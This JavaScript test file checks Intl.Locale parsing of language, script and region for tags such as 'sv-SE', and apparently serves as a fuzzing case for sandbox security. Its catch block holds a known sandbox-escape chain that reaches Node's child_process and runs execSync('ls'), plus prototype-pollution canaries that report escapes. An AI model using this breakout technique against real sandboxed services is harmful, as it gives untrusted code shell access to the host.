try {
    var loc = new Intl.Locale('sv');
    assert.sameValue(loc.baseName, 'sv');
    assert.sameValue(loc.language, 'sv');
    assert.sameValue(loc.script, undefined);
    assert.sameValue(loc.region, undefined);
    var loc = new Intl.Locale('sv-Latn');
    assert.sameValue(loc.baseName, 'sv-Latn');
    assert.sameValue(loc.language, 'sv');
    assert.sameValue(loc.script, 'Latn');
    assert.sameValue(loc.region, undefined);
    var loc = new Intl.Locale('sv-SE');
    assert.sameValue(loc.baseName, 'sv-SE');
    assert.sameValue(loc.language, 'sv');
    assert.sameValue(loc.script, undefined);
    assert.sameValue(loc.region, 'SE');
    var loc = new Intl.Locale('de-1901');
    assert.sameValue(loc.baseName, 'de-1901');
    assert.sameValue(loc.language, 'de');
    assert.sameValue(loc.script, undefined);
    assert.sameValue(loc.region, undefined);
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}